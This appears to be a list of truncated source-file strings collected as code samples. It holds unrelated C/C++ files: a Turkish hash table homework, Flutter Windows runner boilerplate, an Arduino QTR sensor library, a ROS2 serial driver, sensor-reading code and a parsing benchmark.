satirlar[];\r\n} Tablo;\r\n\r\nTablo Tablolar;\r\n\r\nvoid initialize() { //Olu\u015fturulan listeye -1 de\u011ferlerini atad\u0131m\r\n\tfor(int i = 0; i < tablo_boyutu; i++){\r\n\t    Tablolar.satirlar[i].index = -1;\r\n\t\tTablolar.satirlar[i].musteri_numarasi = -1;\r\n\t\tTablolar.satirlar[i].link = -1;\r\n\t}\r\n}\r\n\r\nint hash(int numara){ //Mod \u0130\u015flemini yapt\u0131\u011f\u0131m fonksiyon\r\n\treturn (numara % tablo_boyutu);\r\n}\r\n\r\nvoid ekle(int musteri_numarasi, char * musteri_ad, char * musteri_soyad) { \r\n\tint adres = hash(musteri_numarasi), gecici = adres; //adres de\u011fi\u015fkenine m\u00fc\u015fteri numaras\u0131n\u0131n modunu al\u0131p atad\u0131m.\r\n\tif(Tablolar.satirlar[adres].index == -1){ //e\u011fer listedeki index bo\u015fsa(-1 ise) fonksiyona parametre olarak gelen de\u011ferleri atad\u0131m.\r\n\t\tTablolar.satirlar[adres].index=adres;\r\n\t\tTablolar.satirlar[adres].musteri_numarasi = musteri_numarasi;\r\n\t\tstrcpy(Tablolar.satirlar[adres].musteri_ad, musteri_ad);\r\n\t\tstrcpy(Tablolar.satirlar[adres].musteri_soyad, musteri_soyad);\r\n\t}\r\n\telse {\r\n\t\tint gecici_boyut = 0, gecici_boyut2 = 0;\r\n\t\tadres = 0;\r\n\t\twhile(gecici_boyut != tablo_boyutu){ //s\u0131r\u0131dan ba\u015flat\u0131p t\u00fcm listeyi gezen while d\u00f6ng\u00fcs\u00fc\r\n\t\t\tif(Tablolar.satirlar[adres].index == -1){ //0. indexteki bo\u015fsa parametre olarak gelenleri e\u015fitliyorum.\r\n\t\t\t\tTablolar.satirlar[adres].index = adres;\r\n\t\t\t\tTablolar.satirlar[adres].musteri_numarasi = musteri_numarasi;\r\n\t\t\t\tstrcpy(Tablolar.satirlar[adres].musteri_ad, musteri_ad);\r\n\t\t\t\tstrcpy(Tablolar.satirlar[adres].musteri_soyad, musteri_soyad);\r\n\t\t\t\tif(Tablolar.satirlar[gecici].link == -1){ //E\u011fer listenin linki bo\u015fsa gecicideki linke o an adresteki linki at\u0131yorum.\r\n\t\t\t\t\tTablolar.satirlar[gecici].link = Tablolar.satirlar[adres].index;\r\n\t\t\t\t\treturn;\r\n\t\t\t\t}\r\n\t\t\t\telse { \r\n\t\t\t\t\twhile(gecici_boyut2 != tablo_boyutu - 1){\r\n\t\t\t\t\t\tif(hash(Tablolar.satirlar[gecici_boyut2].musteri_numarasi) == gecici && Tablolar.satirlar[gecici_boyut2].link == -1){ //gecici olarak yeniden atad\u0131\u011f\u0131m 0 de\u011ferindeki m\u00fc\u015fteri numaras\u0131n\u0131 hash fonksiyonuna g\u00f6nderdim. d\u00f6nen de\u011fer ile o indexteki link bo\u015fsa ona ba\u011flad\u0131m.\r\n\t\t\t\t\t\t\tTablolar.satirlar[gecici_boyut2].link = Tablolar.satirlar[adres].index;\r\n\t\t\t\t\t\t\tprintf(\"Tum Musteriler Basariyla Eklendi!\\n\");\r\n\t\t\t\t\t\t\treturn;\r\n\t\t\t\t\t\t}\r\n\t\t\t\t\t\tgecici_boyut2++;\r\n\t\t\t\t\t}\r\n\t\t\t\t\tprintf(\"Hata Olustu! Musteri Eklenemedi!\\n\");\t\t\t\t\t\t\r\n\t\t\t\t}\t\t\t\t\r\n\t\t\t\treturn;\r\n\t\t\t}\r\n\t\t\tadres++;\r\n\t\t\tgecici_boyut++;\r\n\t\t}\r\n\t\tprintf(\"Tablo Dolu!\\n\");\r\n\t\treturn;\r\n\t}\r\n}\r\n\r\nint ara(int musteri_numarasi){\r\n\tint adres = hash(musteri_numarasi), gecici = adres, sayac = 0;\r\n\tif(Tablolar.satirlar[adres].musteri_numarasi == musteri_numarasi){ //E\u011fer arad\u0131\u011f\u0131m\u0131z de\u011fer ilk listede yani direk bulabiliyorsak buras\u0131 \u00e7al\u0131\u015f\u0131yor.\r\n\t\tprintf(\"%d Numarali Musteri %d Adimda Bulundu!\\n\", musteri_numarasi, ++sayac);\r\n\t\treturn 0;\r\n\t}\r\n\telse {\t\r\n\t\tint gecici_boyut = 0;\r\n\t\twhile(gecici_boyut != tablo_boyutu){\r\n\t\t\tsayac++;\r\n\t\t\tif(Tablolar.satirlar[Tablolar.satirlar[adres].link].musteri_numarasi == musteri_numarasi){ //e\u011fer linke g\u00f6re arama yapmak gerekirse buras\u0131 \u00e7al\u0131\u015f\u0131yor. adresteki linke bak\u0131p gelen de\u011fer ayn\u0131 m\u0131 diye kontrol ediyor. de\u011filse di\u011fer adrese y\u00fckseltiyorum.\r\n\t\t\t\tprintf(\"%d Numarali Musteri %d Adimda Bulundu!\\n\", musteri_numarasi, sayac);\r\n\t\t\t\treturn 0;\r\n\t\t\t}\r\n\t\t\tif(hash(Tablolar.satirlar[gecici_boyut].musteri_numarasi) == gecici){ //linke g\u00f6re arama yapt\u0131\u011f\u0131m\u0131zda \u00f6nceki linki takip edebilmek i\u00e7in adresi g\u00fcncelliyorum.\r\n\t\t\t\tadres = gecici_boyut;\r\n\t\t\t}\r\n\t\t\tgecici_boyut++;\r\n\t\t}\r\n\t\tprintf(\"Aradiginiz Musteri Bulunamadi!\\n\");\r\n\t\treturn -1;\r\n\t}\r\n}\r\n\r\nvoid listele(){\r\n\tprintf(\"Index\\tNumara\\tAdi\\tSoyadi\\tLink\\n\");\r\n\tprintf(\"--------------------------------------\\n\");\r\n \tfor(int i = 0; i < tablo_boyutu; i++){\r\n\t\tprintf(\"%d \\t\", i);\r\n\t\tprintf(\"%d \\t\", Tablolar.satirlar[i].musteri_numarasi);\r\n\t\tprintf(\"%s \\t\", Tablolar.satirlar[i].musteri_ad);\r\n\t\tprintf(\"%s \\t\", Tablolar.satirlar[i].musteri_soyad);\r\n\t\tprintf(\"%d \\t\", Tablolar.satirlar[i].link); \t\t\t\r\n\t\tprintf(\"\\n\");\r\n\t}\r\n}\r\n\r\nint main(){\r\n\tprintf(\"Uygulama 2\\n\");\r\n\tprintf(\"Tablo Boyutu Giriniz: \");\r\n\tscanf(\"%d\", &adet);\r\n\ttablo_boyutu = adet;\r\n\tinitialize();\r\n\tekle(10, \"faruk\", \"ipek\");\r\n\tekle(13, \"tarik\", \"cakir\");\r\n\tekle(23, \"ahmet\", \"yilmaz\");\r\n\tekle(",
    "#include \"flutter_window.h\"\r\n\r\n#include <optional>\r\n\r\n#include \"flutter/generated_plugin_registrant.h\"\r\n\r\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\r\n    : project_(project) {}\r\n\r\nFlutterWindow::~FlutterWindow() {}\r\n\r\nbool FlutterWindow::OnCreate() {\r\n  if (!Win32Window::OnCreate()) {\r\n    return false;\r\n  }\r\n\r\n  RECT frame = GetClientArea();\r\n\r\n  // The size here must match the window dimensions to avoid unnecessary surface\r\n  // creation / destruction in the startup path.\r\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\r\n      frame.right - frame.left, frame.bottom - frame.top, project_);\r\n  // Ensure that basic setup of the controller was successful.\r\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\r\n    return false;\r\n  }\r\n  RegisterPlugins(flutter_controller_->engine());\r\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\r\n\r\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\r\n    this->Show();\r\n  });\r\n\r\n  // Flutter can complete the first frame before the \"show window\" callback is\r\n  // registered. The following call ensures a frame is pending to ensure the\r\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\r\n  flutter_controller_->ForceRedraw();\r\n\r\n  return true;\r\n}\r\n\r\nvoid FlutterWindow::OnDestroy() {\r\n  if (flutter_controller_) {\r\n    flutter_controller_ = nullptr;\r\n  }\r\n\r\n  Win32Window::OnDestroy();\r\n}\r\n\r\nLRESULT\r\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\r\n                              WPARAM const wparam,\r\n                              LPARAM const lparam) noexcept {\r\n  // Give Flutter, including plugins, an opportunity to handle window messages.\r\n  if (flutter_controller_) {\r\n    std::optional<LRESULT> result =\r\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\r\n                                                      lparam);\r\n    if (result) {\r\n      return *result;\r\n    }\r\n  }\r\n\r\n  switch (message) {\r\n    case WM_FONTCHANGE:\r\n      flutter_controller_->engine()->ReloadSystemFonts();\r\n      break;\r\n  }\r\n\r\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\r\n}\r\n",
    "#include \"QTRSensors.h\"\n#include <Arduino.h>\n\nvoid QTRSensors::setTypeRC()\n{\n  _type = QTRType::RC;\n  _maxValue = _timeout;\n}\n\nvoid QTRSensors::setTypeAnalog()\n{\n  _type = QTRType::Analog;\n  _maxValue = 1023; // Arduino analogRead() returns a 10-bit value by default\n}\n\nvoid QTRSensors::setSensorPins(const uint8_t * pins, uint8_t sensorCount)\n{\n  if (sensorCount > QTRMaxSensors) { sensorCount = QTRMaxSensors; }\n\n  // (Re)allocate and initialize the array if necessary.\n  uint8_t * oldSensorPins = _sensorPins;\n  _sensorPins = (uint8_t *)realloc(_sensorPins, sizeof(uint8_t) * sensorCount);\n  if (_sensorPins == nullptr)\n  {\n    // Memory allocation failed; don't continue.\n    free(oldSensorPins); // deallocate any memory used by old array\n    return;\n  }\n\n  for (uint8_t i = 0; i < sensorCount; i++)\n  {\n    _sensorPins[i] = pins[i];\n  }\n\n  _sensorCount = sensorCount;\n\n  // Any previous calibration values are no longer valid, and the calibration\n  // arrays might need to be reallocated if the sensor count was changed.\n  calibrationOn.initialized = false;\n  calibrationOff.initialized = false;\n}\n\nvoid QTRSensors::setTimeout(uint16_t timeout)\n{\n  if (timeout > 32767) { timeout = 32767; }\n  _timeout = timeout;\n  if (_type == QTRType::RC) { _maxValue = timeout; }\n}\n\nvoid QTRSensors::setSamplesPerSensor(uint8_t samples)\n{\n  if (samples > 64) { samples = 64; }\n  _samplesPerSensor = samples;\n}\n\nvoid QTRSensors::setEmitterPin(uint8_t emitterPin)\n{\n  releaseEmitterPins();\n\n  _oddEmitterPin = emitterPin;\n  pinMode(_oddEmitterPin, OUTPUT);\n\n  _emitterPinCount = 1;\n}\n\nvoid QTRSensors::setEmitterPins(uint8_t oddEmitterPin, uint8_t evenEmitterPin)\n{\n  releaseEmitterPins();\n\n  _oddEmitterPin = oddEmitterPin;\n  _evenEmitterPin = evenEmitterPin;\n  pinMode(_oddEmitterPin, OUTPUT);\n  pinMode(_evenEmitterPin, OUTPUT);\n\n  _emitterPinCount = 2;\n}\n\nvoid QTRSensors::releaseEmitterPins()\n{\n  if (_oddEmitterPin != QTRNoEmitterPin)\n  {\n    pinMode(_oddEmitterPin, INPUT);\n    _oddEmitterPin = QTRNoEmitterPin;\n  }\n\n  if (_evenEmitterPin != QTRNoEmitterPin)\n  {\n    pinMode(_evenEmitterPin, INPUT);\n    _evenEmitterPin = QTRNoEmitterPin;\n  }\n\n  _emitterPinCount = 0;\n}\n\nvoid QTRSensors::setDimmingLevel(uint8_t dimmingLevel)\n{\n  if (dimmingLevel > 31) { dimmingLevel = 31; }\n  _dimmingLevel = dimmingLevel;\n}\n\n// emitters defaults to QTREmitters::All; wait defaults to true\nvoid QTRSensors::emittersOff(QTREmitters emitters, bool wait)\n{\n  bool pinChanged = false;\n\n  // Use odd emitter pin in these cases:\n  // - 1 emitter pin, emitters = all\n  // - 2 emitter pins, emitters = all\n  // - 2 emitter pins, emitters = odd\n  if (emitters == QTREmitters::All ||\n      (_emitterPinCount == 2 && emitters == QTREmitters::Odd))\n  {\n    // Check if pin is defined and only turn off if not already off\n    if ((_oddEmitterPin != QTRNoEmitterPin) &&\n        (digitalRead(_oddEmitterPin) == HIGH))\n    {\n      digitalWrite(_oddEmitterPin, LOW);\n      pinChanged = true;\n    }\n  }\n\n  // Use even emitter pin in these cases:\n  // - 2 emitter pins, emitters = all\n  // - 2 emitter pins, emitters = even\n  if (_emitterPinCount == 2 &&\n      (emitters == QTREmitters::All || emitters == QTREmitters::Even))\n  {\n    // Check if pin is defined and only turn off if not already off\n    if ((_evenEmitterPin != QTRNoEmitterPin) &&\n        (digitalRead(_evenEmitterPin) == HIGH))\n    {\n      digitalWrite(_evenEmitterPin, LOW);\n      pinChanged = true;\n    }\n  }\n\n  if (wait && pinChanged)\n  {\n    if (_dimmable)\n    {\n      // driver min is 1 ms\n      delayMicroseconds(1200);\n    }\n    else\n    {\n      delayMicroseconds(200);\n    }\n  }\n}\n\nvoid QTRSensors::emittersOn(QTREmitters emitters, bool wait)\n{\n  bool pinChanged = false;\n  uint16_t emittersOnStart;\n\n  // Use odd emitter pin in these cases:\n  // - 1 emitter pin, emitters = all\n  // - 2 emitter pins, emitters = all\n  // - 2 emitter pins, emitters = odd\n  if (emitters == QTREmitters::All ||\n      (_emitterPinCount == 2 && emitters == QTREmitters::Odd))\n  {\n    // Check if pin is defined, and only turn on non-dimmable sensors if not\n    // already on, but always turn dimmable sensors off and back on because\n    // we might be changing the dimming level (emittersOnWithPin() should take\n    // care of this)\n    if ((_oddEmitterPin != QTRNoEmitterPin) &&\n        ( _dimmable || (digitalRead(_oddEmitterPin) == LOW)))\n    {\n      emittersOnStart = emittersOnWithPin(_oddEmitterPin);\n      pinChanged = true;\n    }\n  }\n\n  // Use even emitter pin in these cases:\n  // - 2 emitter pins, emitters = all\n  // - 2 emitter pins, emitters = even\n  if (_emitterPinCount == 2 &&\n      (emitters == QTREmitters::All || emitters == QTREmitters::Even))\n  {\n    // Check if pin is defined, and only turn on non-dimmable sensors if not\n    // already on, but always turn dimmable sensors off and back on because\n    // we might be changing the dimming level (emittersOnWithPin() should take\n    // care of this)\n    if ((_evenEmitterPin != QTRNoEmitterPin) &&\n        (_dimm",
    "#include <custom_serial_driver/serial_driver.h>\n\n#include <cstdint>\n#include <cstring>\n\n#include <chrono>\n#include <exception>\n#include <vector>\n\n#include <rclcpp/logging.hpp>\n#include <rclcpp/utilities.hpp>\n\n#include <fmt/format.h>\n\n#include <custom_serial_driver/crc.h>\n\nnamespace custom_serial {\nSerialDriverNode::SerialDriverNode(const rclcpp::NodeOptions &options)\n    : Node(\"serial_port\", options), m_io_ctx(new IoContext(3)),\n      m_driver(new drivers::serial_driver::SerialDriver(*m_io_ctx)) {\n  initParamenters();\n  RCLCPP_INFO(this->get_logger(), \"%s\", m_device_name.c_str());\n  // Publisher\n  m_receive_pub =\n      this->create_publisher<custom_serial_interfaces::msg::Receive>(\n          \"/custom_serial/receive\", rclcpp::SensorDataQoS());\n  // Serivce\n  using SendPackage = custom_serial_interfaces::srv::SendPackage;\n  m_send_service = this->create_service<SendPackage>(\n      \"custom_serial/send\",\n      [this](const std::shared_ptr<SendPackage::Request> req,\n             std::shared_ptr<SendPackage::Response> response) -> void {\n        this->sendData(req->func_code, req->id, req->len, req->data.data());\n        response->status = true;\n      });\n  // Open port && receive thread\n  try {\n    m_driver->init_port(m_device_name, *m_port_cfg);\n    if (!m_driver->port()->is_open())\n      m_driver->port()->open();\n  } catch (const std::exception &e) {\n    RCLCPP_ERROR(this->get_logger(), \"Unable open serial port: %s; %s\",\n                 m_device_name.c_str(), e.what());\n    reopen();\n  }\n  m_receive_thread = std::thread(&SerialDriverNode::receiveData, this);\n  m_receive_thread.detach();\n}\n\nvoid SerialDriverNode::initParamenters() {\n  using FlowControl = drivers::serial_driver::FlowControl;\n  using Parity = drivers::serial_driver::Parity;\n  using StopBits = drivers::serial_driver::StopBits;\n\n  uint32_t baud_rate;\n  auto fc = FlowControl::NONE;\n  auto pt = Parity::NONE;\n  auto sb = StopBits::ONE;\n\n  m_device_name = this->declare_parameter(\"device_name\", \"/dev/ttyACM0\");\n  baud_rate = this->declare_parameter(\"baud_rate\", 115200);\n  const auto fc_str = this->declare_parameter(\"flow_control\", \"none\");\n  const auto pt_str = this->declare_parameter(\"parity\", \"none\");\n  const auto sb_str = this->declare_parameter(\"stop_bits\", \"1\");\n\n  if (fc_str == \"none\") {\n    fc = FlowControl::NONE;\n  } else if (fc_str == \"hardware\") {\n    fc = FlowControl::HARDWARE;\n  } else if (fc_str == \"software\") {\n    fc = FlowControl::SOFTWARE;\n  } else {\n    RCLCPP_ERROR(this->get_logger(), \"%s ;<Usage> none OR hardware OR sofware\",\n                 fc_str.c_str());\n  }\n\n  if (pt_str == \"none\") {\n    pt = Parity::NONE;\n  } else if (pt_str == \"odd\") {\n    pt = Parity::ODD;\n  } else if (pt_str == \"even\") {\n    pt = Parity::EVEN;\n  } else {\n    RCLCPP_ERROR(this->get_logger(), \"%s ;<Usage> none OR odd OR even\",\n                 pt_str.c_str());\n  }\n\n  if (sb_str == \"1\") {\n    sb = StopBits::ONE;\n  } else if (sb_str == \"1.5\") {\n    sb = StopBits::ONE_POINT_FIVE;\n  } else if (sb_str == \"2\") {\n    sb = StopBits::TWO;\n  } else {\n    RCLCPP_ERROR(this->get_logger(), \"%s; <Usage> 1 OR 1.5 OR 2\",\n                 sb_str.c_str());\n  }\n\n  m_port_cfg = std::make_unique<drivers::serial_driver::SerialPortConfig>(\n      baud_rate, fc, pt, sb);\n}\n\nvoid SerialDriverNode::reopen() {\n  RCLCPP_WARN(this->get_logger(), \"try reopen serial port: %s\",\n              m_device_name.c_str());\n  try {\n    if (m_driver->port()->is_open())\n      m_driver->port()->close();\n    m_driver->port()->open();\n    RCLCPP_INFO(this->get_logger(), \"Success open serial port: %s\",\n                m_device_name.c_str());\n  } catch (const std::exception &e) {\n    RCLCPP_ERROR(this->get_logger(), \"Unable open serial port: %s; %s\",\n                 m_device_name.c_str(), e.what());\n    if (rclcpp::ok()) {\n      rclcpp::sleep_for(std::chrono::seconds(1));\n      reopen();\n    }\n  }\n}\n\nvoid SerialDriverNode::receiveData() {\n  std::vector<uint8_t> buff(BUFF_LEN);\n  uint8_t *pbuff;\n  uint8_t *data;\n\n  RCLCPP_INFO(this->get_logger(), \"serial receive thread is running...\");\n  while (rclcpp::ok()) {\n    try {\n      m_driver->port()->receive(buff);\n    } catch (const std::exception &e) {\n      RCLCPP_ERROR_THROTTLE(this->get_logger(), *this->get_clock(), 500,\n                            \"receive error! %s\", e.what());\n    }\n    if (buff[0] == 0x5A) {\n      pbuff = buff.data();\n      uint8_t func_code = *(reinterpret_cast<uint8_t *>(pbuff + 1));\n      uint16_t id = *(reinterpret_cast<uint16_t *>(pbuff + 2));\n      uint16_t len = *(reinterpret_cast<uint16_t *>(pbuff + 4));\n      data = new uint8_t[len];\n      std::memcpy(data, reinterpret_cast<uint16_t *>(pbuff + 6), len);\n      uint16_t crc = *(reinterpret_cast<uint16_t *>(pbuff + 6 + len));\n      auto verify = custom_serial::Verify_CRC16_Check_Sum(data, len);\n\n      auto s = fmt::format(\n          \"fun=0x{:02X}, id=0x{:04X}, len={}, crc=0x{:04X}|0x{:04X};\",\n          func_code, id, len, crc, verify);\n      RCLCPP_DEBUG(this->get_logger(), \"%s; d",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.CreateAndShow(L\"falci\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "/**\n * @file sensors_data.cpp\n * @brief Sensor Data Retrieval\n * @date 2024-04-05\n * @author Izukend\n */\n\n#include \"../../include/sensors_data.h\" // Include necessary libraries\n\n#define RX_PIN 10 // Define the RX pin for serial communication\n#define TX_PIN 11 // Define the TX pin for serial communication\n#define BAUDRATE 9600 // Define the baud rate for serial communication\n\nMHZ19 myMHZ19; // Declare an object for the MH-Z19 sensor\nDHTesp dht; // Declare an object for the DHT22 sensor\nSoftwareSerial mySerial(RX_PIN, TX_PIN); // Declare an object for software serial communication\n\nint dhtPin = 17; // Define the pin to which the DHT22 sensor is connected\n\n/**\n * @brief Function to retrieve CO2 data\n * \n * This function initializes serial communication with the MH-Z19 sensor, retrieves raw CO2 data,\n * adjusts it according to a specific formula, and then converts it to an integer.\n * \n * @return The adjusted CO2 value as an integer\n */\nint recoverCO2Data() {\n    mySerial.begin(BAUDRATE); // Initialize serial communication\n    myMHZ19.begin(mySerial); // Initialize the MH-Z19 sensor\n\n    double adjustedCO2 = myMHZ19.getCO2(); // Retrieve raw CO2 data from the sensor\n\n    Serial.println(\"----------------\");\n    Serial.print(\"CO2 Reading: \");\n    Serial.println(adjustedCO2);\n    // Convert the value to an integer\n    int intValue = int(adjustedCO2);\n    \n    return intValue; // Return the CO2 value\n}\n\n/**\n * @brief Function to retrieve temperature\n * \n * This function sets up the DHT22 sensor, retrieves temperature data, and converts it to an integer.\n * \n * @return The temperature as an integer\n */\nint recoverTemp(){\n    dht.setup(dhtPin, DHTesp::DHT22); // Set up the DHT22 sensor\n    TempAndHumidity value = dht.getTempAndHumidity(); // Retrieve temperature data\n    \n    Serial.println(\"----------------\");\n    Serial.println(\"Temperature Reading:\");\n    Serial.println(value.temperature);\n    \n    int tempValue = int(value.temperature); // Convert temperature to an integer\n    return tempValue; // Return the temperature\n}\n\n/**\n * @brief Function to retrieve humidity\n * \n * This function sets up the DHT22 sensor, retrieves humidity data, and converts it to an integer.\n * \n * @return The humidity as an integer\n */\nint recoverHum() {\n    dht.setup(dhtPin, DHTesp::DHT22); // Set up the DHT22 sensor\n    TempAndHumidity value = dht.getTempAndHumidity(); // Retrieve humidity data\n    \n    Serial.println(\"----------------\");\n    Serial.println(\"Humidity Reading:\");\n    Serial.println(value.humidity);\n    \n    int humidityValue = int(value.humidity); // Convert humidity to an integer\n    return humidityValue; // Return the humidity\n}\n",
    "#include \"test/Environment.hpp\"\n\n#include <chrono>\n#include <filesystem>\n#include <fstream>\n#include <iomanip>\n#include <iostream>\n\n\n\nconstexpr size_t MAX_MEMORY_SIZE = 32 * 1024 * 1024;\nconstexpr size_t WARMUP_ITERATIONS = 5;\nconstexpr size_t WARMUP_BLOCK_SIZE = 1024 * 1024;\nconstexpr size_t BENCH_ITERATIONS = 10;\nconstexpr size_t CONSUME_ITERATIONS = 1;\nconst std::vector<size_t> BLOCK_SIZES = {\n        1024,\n        2048,\n        4096,\n        8192,\n        16384,\n        32768,\n        65536,\n        131072,\n        262144,\n        524288,\n        1048576,\n        2097152,\n        4194304,\n        8388608,\n        16777216\n};\n\n\n\nvoid RunBenchmarkIter(const std::filesystem::path& input_file_path,\n                      const std::filesystem::path& output_dir_path,\n                      size_t block_size,\n                      bool is_warmup)\n{\n    std::ifstream input_file(input_file_path, std::ios::binary | std::ios::in);\n\n    size_t input_file_size = std::filesystem::file_size(input_file_path);\n    size_t curr_file_pos = 0;\n\n    InputStream is;\n    std::list<DataStream::Block> storage;\n\n    stats::total_allocations = 0;\n    stats::total_bytes_allocated = 0;\n\n    size_t result = 0;\n    size_t total_microseconds = 0;\n    size_t fetch_microseconds = 0;\n    size_t consume_microseconds = 0;\n    while (curr_file_pos < input_file_size || is.remainingBytes() > 0) {\n        while (is.remainingBytes() < MAX_MEMORY_SIZE && curr_file_pos < input_file_size) {\n            const size_t curr_block_size = std::min(input_file_size - curr_file_pos, block_size);\n            DataStream::Block block(std::shared_ptr<uint8_t[]>(new uint8_t[curr_block_size]), curr_block_size);\n            input_file.read((char*)block.data(), curr_block_size);\n            is.add(block);\n            storage.push_back(block);\n            curr_file_pos += curr_block_size;\n        }\n\n        std::chrono::high_resolution_clock::time_point fetch_start = std::chrono::high_resolution_clock::now();\n        Allocator::startScope();\n        {\n            statshouse::HighLevelType data = statshouse::HighLevelType::fetch(is);\n            fetch_microseconds += std::chrono::duration_cast<std::chrono::microseconds>(std::chrono::high_resolution_clock::now() - fetch_start).count();\n\n            std::visit([&](auto&& arg) {\n                for (size_t i = 0; i < CONSUME_ITERATIONS; ++i) {\n                    std::chrono::high_resolution_clock::time_point consume_start = std::chrono::high_resolution_clock::now();\n                    result += consume(arg);\n                    consume_microseconds += std::chrono::duration_cast<std::chrono::microseconds>( std::chrono::high_resolution_clock::now() - consume_start).count();\n                }\n            },\n                       data.get());\n        }\n        Allocator::endScope();\n        total_microseconds += std::chrono::duration_cast<std::chrono::microseconds>(std::chrono::high_resolution_clock::now() - fetch_start).count();\n\n        while (!storage.empty() && storage.front().sptr.use_count() == 1) {\n            storage.pop_front();\n        }\n        //        std::cout << std::setprecision(3) << (double)curr_file_pos / double(file_size) * 100 << '%' << std::endl;\n    }\n\n    if (!is_warmup) {\n        std::ofstream output_file(output_dir_path / (std::to_string(block_size) + \".txt\"), std::ios::app | std::ios::out);\n        output_file << total_microseconds << ' '\n                    << fetch_microseconds << ' '\n                    << consume_microseconds << ' '\n                    << stats::total_allocations << ' '\n                    << stats::total_bytes_allocated << ' ' << std::endl;\n\n        std::cout << \"CONSUME_RESULT: \" << result << std::endl;\n        std::cout << std::endl;\n        std::cout << \"TOTAL_TIME_MICROSECONDS: \" << total_microseconds << std::endl;\n        std::cout << \"FETCH_TIME_MICROSECONDS: \" << fetch_microseconds << std::endl;\n        std::cout << \"CONSUME_TIME_MICROSECONDS: \" << consume_microseconds << std::endl;\n        std::cout << std::endl;\n        std::cout << \"TOTAL_ALLOCATIONS: \" << stats::total_allocations << std::endl;\n        std::cout << \"TOTAL_BYTES_ALLOCATED: \" << stats::total_bytes_allocated << std::endl;\n    }\n}\n\n\n\nint main(int argc, char* argv[])\n{\n    if (argc < 3) {\n        std::cout << \"Not enough arguments\" << std::endl;\n        return 1;\n    }\n\n    std::filesystem::path input_file_path(argv[1]);\n    std::filesystem::path output_dir_path(argv[2]);\n\n    std::cout << \"WARMUP START\" << std::endl;\n    for (size_t i = 0; i < WARMUP_ITERATIONS; ++i) {\n        RunBenchmarkIter(input_file_path, output_dir_path, WARMUP_BLOCK_SIZE, true);\n    }\n    std::cout << \"WARMUP END\" << std::endl;\n\n    for (size_t block_size : BLOCK_SIZES) {\n        for (size_t i = 0; i < BENCH_ITERATIONS; ++i) {\n            std::cout << std::endl\n                      << block_size << ' ' << i + 1 << '/' << BENCH_ITERATIONS << std::endl;\n            RunBenchmarkIter(input_file_path, output_dir_path, block_size, ",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"weatherapp\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"lecture7example1\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return 